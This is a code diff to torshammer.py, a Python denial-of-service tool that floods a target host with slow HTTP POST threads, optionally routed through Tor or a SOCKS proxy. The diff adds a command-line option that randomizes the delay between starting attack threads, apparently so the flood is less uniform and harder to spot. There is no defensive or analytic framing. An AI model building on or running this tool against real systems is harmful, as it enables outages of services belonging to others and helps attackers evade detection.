@@ -126,13 +126,14 @@ def usage():
     print(" -S|--sockshost <SOCKS host addrees> eg: 127.0.0.1")
     print(" -P|--socksport <SOCSS host port> Defaults to 1080")
     print(" -i|--max-delay <max seconds beetwen packets in float> Defaults to 3.0")
+    print(" -s|--pre-sleep-on-thread-start <max seconds beetween starting threads> Default to none")
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:i:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport=", "max-delay="])
+        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:i:s:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport=", "max-delay=", "pre-sleep-on-thread-start="])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -146,6 +147,7 @@ def main(argv):
     sockshost = False
     socksport = 1080
     maxsecondsbeetweenpacket = 3
+    presleepbeetweenthreadstart = None
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -165,6 +167,8 @@ def main(argv):
             socksport = int(a)
         elif o in ("-i", "--max-delay"):
             maxsecondsbeetweenpacket = float(a)
+        elif o in ("-s", "--pre-sleep-on-thread-start"):
+            presleepbeetweenthreadstart = float(a)
 
     if target == '' or int(threads) <= 0:
         usage()
@@ -193,6 +197,8 @@ def main(argv):
         t = httpPost(target, port, tor, sockshost, socksport, maxsecondsbeetweenpacket)
         rthreads.append(t)
         t.start()
+        if presleepbeetweenthreadstart:
+            time.sleep(random.uniform(0.1, presleepbeetweenthreadstart))
 
     while len(rthreads) > 0:
         try:
